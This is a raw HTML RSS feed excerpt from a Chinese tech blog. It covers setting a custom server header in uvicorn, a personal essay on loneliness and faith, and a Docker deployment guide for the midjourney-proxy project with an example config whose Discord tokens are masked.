<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">    title</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"uvicorn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">    description</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"uvicorn教程"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">    version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"beta 0.1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "__main__"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    uvicorn.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        "run:app"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        host</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"127.0.0.1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        port</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        log_level</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"info"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        reload</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">True</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        workers</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        debug</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">True</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        headers</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"server"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"2678885646@qq.com.server"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    )</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后重启整个uvicorn服务器，自动重新加载无效。</p>
<h2>结果</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-length:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> application/json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> date:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Thu,10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Aug</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2023</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 05:55:20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GMT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> server:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2678885646@qq.com.server</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>孤独与信仰：我们该如何面对</title>
      <link>https://www.geekery.cn/note-book/%E7%94%9F%E6%B4%BB/%E5%AD%A4%E7%8B%AC%E4%B8%8E%E4%BF%A1%E4%BB%B0%EF%BC%9A%E6%88%91%E4%BB%AC%E8%AF%A5%E5%A6%82%E4%BD%95%E9%9D%A2%E5%AF%B9.html</link>
      <guid>https://www.geekery.cn/note-book/%E7%94%9F%E6%B4%BB/%E5%AD%A4%E7%8B%AC%E4%B8%8E%E4%BF%A1%E4%BB%B0%EF%BC%9A%E6%88%91%E4%BB%AC%E8%AF%A5%E5%A6%82%E4%BD%95%E9%9D%A2%E5%AF%B9.html</guid>
      <source url="https://www.geekery.cn/rss.xml">孤独与信仰：我们该如何面对</source>
      <description>孤独与信仰：我们该如何面对 ​ 有一种药，如果吃了就能彻底治愈，不再需要继续服用。我们称这种药为解药或良药。然而，如果有一种药，你吃了之后还会想吃，想要更多，甚至希望每天都服用，并希望身边的人也一同分享，这绝对不是解药，而是毒药。而我所知道，这种药叫做信仰。 image-20240720113523197 ​ 信仰为何如此诱人？因为信仰紧紧抓住了人类的...</description>
      <pubDate>Sat, 20 Jul 2024 03:43:15 GMT</pubDate>
      <content:encoded><![CDATA[
<p>​	有一种药，如果吃了就能彻底治愈，不再需要继续服用。我们称这种药为解药或良药。然而，如果有一种药，你吃了之后还会想吃，想要更多，甚至希望每天都服用，并希望身边的人也一同分享，这绝对不是解药，而是毒药。而我所知道，这种药叫做信仰。</p>
<p></p>
<p>​	信仰为何如此诱人？因为信仰紧紧抓住了人类的软肋——孤独。信仰承诺了一个美好的未来和幻境，以安抚我们对孤独的恐惧。然而，我们必须明白，孤独不仅仅是一种修辞，它更是一种真实的感受。因此，如果你不想感到孤独，就不要总想着“终将”。享受当下的每一刻，不要在夏天思考秋天，不要在相聚时忧虑离别。但如果你想深入思考人生的终极意义，就不可避免地要面对孤独。</p>
<p>​	你问我，我身边朋友朋友父亲最孤独的那一刻是哪一刻？是我朋友父亲48岁那一年，那是他的第四个本命年。我的朋友的奶奶因突发心肌梗塞去世。人在极度悲痛的背后，往往会陷入一种平静。在火葬场回家的路上，他的父亲非常平静地说了一句：“妈走了，家散了。”那一年夏天，随着拖拉机的轰鸣，我朋友家的老街被推平。老街曾承载了他父亲的青春，也承载了他的童年。</p>
<p></p>
<p>​	尽管现在他们逢年过节依旧团团聚聚，一起吃饭，对方说：“你看，其实家没有散，因为我家现在逢年过节也是一家子团团聚聚，一起吃饭。其实老街也没有散，因为现在那一条老街被更繁华的星巴克和麦当劳所占据。”然而，我知道那一刻，世界上再也没有人记得我朋友的父亲是如何长大的了。没有任何记忆能够填补前面的一段记忆。</p>
<p>​	我们有时觉得自己不孤独，觉得自己特别完整、自足和满足，但其实，我们并不是完整的个体，而是因为每一片碎片都有一个地方和一个人替我们珍藏。可是，我要告诉大家的是，终有一天，这些触角将永远消失。就像90后开始失去了，00后开始失去了，互联网也开始坍缩了，总有一天我们都会失去。今天，青春年少时我们风光无限，风雨无阻。我们不断收集碎片，有些碎片可以和别人的拼接，拼接成越来越大的版图。然而，终有一天，我们转头一看，会发现满目疮痍，曾经的记忆已被遗忘。</p>
<p></p>
<p>​	最终，没有人能够告诉我们，我们是从何而来，我们将向何处去。因为没有人能活着告诉我们死亡的真实感受。人生最悲哀的事，莫过于终将变成孤儿。在时间的维度面前，人类不过是时间的孤儿。然而，这恰恰是人类最幸运的事情。因为人终将成为孤儿，所以我们不可依赖于天赋，也不寻找上帝。只有我是自己的主人
只有我能是自己的主人，那一刻，我感受到了孤独给予我的自由。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Midjourney-proxy代理Midjourney的Discord频道</title>
      <link>https://www.geekery.cn/note-book/Midjourney/Midjourney-proxy%E4%BB%A3%E7%90%86Midjourney%E7%9A%84Discord%E9%A2%91%E9%81%93.html</link>
      <guid>https://www.geekery.cn/note-book/Midjourney/Midjourney-proxy%E4%BB%A3%E7%90%86Midjourney%E7%9A%84Discord%E9%A2%91%E9%81%93.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Midjourney-proxy代理Midjourney的Discord频道</source>
      <description>Midjourney-proxy代理Midjourney的Discord频道 代理 Midjourney 的 Discord 频道，实现 API 形式调用 AI 。 这个作者一个小时更新一次Release，带着bug就更了，太着急哈哈哈哈。 找到一个文档版本在部署免得时间上的浪费。 已测试 v2.3.0 为不稳定版本，存在进度卡住的问题。 https:...</description>
      <pubDate>Fri, 19 Jul 2024 08:20:32 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>代理 Midjourney 的 Discord 频道，实现 API 形式调用 AI 。</p>
<p>这个作者一个小时更新一次Release，带着bug就更了，太着急哈哈哈哈。</p>
<p>找到一个文档版本在部署免得时间上的浪费。</p>
<p>已测试 <a href="https://github.com/trueai-org/midjourney-proxy/releases/tag/v2.3.0" target="_blank" rel="noopener noreferrer">v2.3.0</a> 为不稳定版本，存在进度卡住的问题。</p>
<p><a href="https://github.com/trueai-org/midjourney-proxy" target="_blank" rel="noopener noreferrer">https://github.com/trueai-org/midjourney-proxy</a></p>
</blockquote>
<h2>主要功能</h2>
<p>支持 Imagine 指令和相关动作 [V1/V2.../U1/U2.../R]</p>
<p>Imagine 时支持添加图片 base64，作为垫图</p>
<p>支持 Blend (图片混合)、Describe (图生文) 指令</p>
<p>支持任务实时进度</p>
<p>支持中文 prompt 翻译，需配置百度翻译</p>
<p>prompt 敏感词预检测，支持覆盖调整</p>
<p>user-token 连接 wss，可以获取错误信息和完整功能</p>
<p>支持 Shorten(prompt分析) 指令</p>
<p>支持焦点移动：Pan ⬅️➡⬆️⬇️</p>
<p>支持局部重绘：Vary (Region) 🖌</p>
<p>支持几乎所有的关联按钮动作和 🎛️ Remix 模式</p>
<p>支持图片变焦，自定义变焦 Zoom 🔍</p>
<p>支持获取图片的 seed 值</p>
<p>支持账号指定生成速度模式 RELAX | FAST | TURBO</p>
<p>支持多账号配置，每个账号可设置对应的任务队列，支持账号选择模式 BestWaitIdle | Random | Weight | Polling</p>
<p>账号池持久化，动态维护</p>
<p>支持获取账号 /info、/settings 信息</p>
<p>账号 settings 设置</p>
<p>支持 niji・journey Bot 和 Midjourney Bot</p>
<p>zlib-stream 安全压缩传输 <a href="https://discord.com/developers/docs/topics/gateway" target="_blank" rel="noopener noreferrer">https://discord.com/developers/docs/topics/gateway</a></p>
<p>内嵌MJ管理后台页面，支持多语言 <a href="https://github.com/trueai-org/midjourney-proxy-webui" target="_blank" rel="noopener noreferrer">https://github.com/trueai-org/midjourney-proxy-webui</a></p>
<p>支持MJ账号的增删改查功能</p>
<p>支持MJ账号的详细信息查询和账号同步操作</p>
<p>支持MJ账号的并发队列设置</p>
<p>支持MJ的账号settings设置</p>
<p>支持MJ的任务查询</p>
<p>提供功能齐全的绘图测试页面</p>
<p>兼容支持市面上主流绘图客户端和 API 调用。</p>
<h2>在线预览</h2>
<p>公益接口为慢速模式，接口免费调用，账号池由赞助者提供，请大家合理使用。</p>
<ul>
<li>管理后台：<a href="https://ai.trueai.org" target="_blank" rel="noopener noreferrer">https://ai.trueai.org</a></li>
<li>账号密码：<code>无</code></li>
<li>接口文档：<a href="https://ai.trueai.org/swagger" target="_blank" rel="noopener noreferrer">https://ai.trueai.org/swagger</a></li>
<li>接口密钥：<code>无</code></li>
</ul>
<h2>部署项目</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 阿里云镜像（推荐国内使用）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> registry.cn-guangzhou.aliyuncs.com/trueai-org/midjourney-proxy</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 公益演示站点启动配置示例</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 1.下载并重命名配置文件（示例配置）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -O</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjopen/appsettings.Production.json</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://raw.githubusercontent.com/trueai-org/midjourney-proxy/main/src/Midjourney.API/appsettings.json</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 或使用 curl 下载并重命名配置文件（示例配置）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjopen/appsettings.Production.json</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://raw.githubusercontent.com/trueai-org/midjourney-proxy/main/src/Midjourney.API/appsettings.json</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 2.停止并移除旧的 Docker 容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mjopen</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mjopen</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 3.启动新的 Docker 容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mjopen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --restart=always</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEMO=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8086:8080</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjopen/logs:/app/logs:rw</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjopen/data:/app/data:rw</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjopen/appsettings.Production.json:/app/appsettings.Production.json:ro</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TZ=Asia/Shanghai</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/localtime:/etc/localtime:ro</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/timezone:/etc/timezone:ro</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> registry.cn-guangzhou.aliyuncs.com/trueai-org/midjourney-proxy</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 生产环境启动配置示例</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mjproxy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --restart=always</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8088:8080</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjproxy/logs:/app/logs:rw</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjproxy/data:/app/data:rw</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/mjproxy/appsettings.Production.json:/app/appsettings.Production.json:ro</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TZ=Asia/Shanghai</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/localtime:/etc/localtime:ro</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/timezone:/etc/timezone:ro</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> registry.cn-guangzhou.aliyuncs.com/trueai-org/midjourney-proxy</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>参数配置</h3>
<p>appsettings.Production.json</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "Demo"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 网站配置为演示模式</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "UserToken"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 用户绘画令牌 token，可以用来访问绘画接口，可以不用设定</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "AdminToken"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 管理后台令牌 token，可以用来访问绘画接口和管理员账号等功能</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "mj"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "AccountChooseRule"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"BestWaitIdle"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// BestWaitIdle | Random | Weight | Polling = 最佳空闲规则 | 随机 | 权重 | 轮询</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "Discord"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: { </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// Discord 配置，默认可以为 null</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "GuildId"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"125652671***"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 服务器 ID</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "ChannelId"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"12565267***"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 频道 ID</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "PrivateChannelId"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"1256495659***"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// MJ 私信频道 ID，用来接受 seed 值</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "NijiBotChannelId"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"1261608644***"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// NIJI 私信频道 ID，用来接受 seed 值</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "UserToken"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"MTI1NjQ5N***"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 用户 token</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "BotToken"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"MTI1NjUyODEy***"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 机器人 token</span></span>
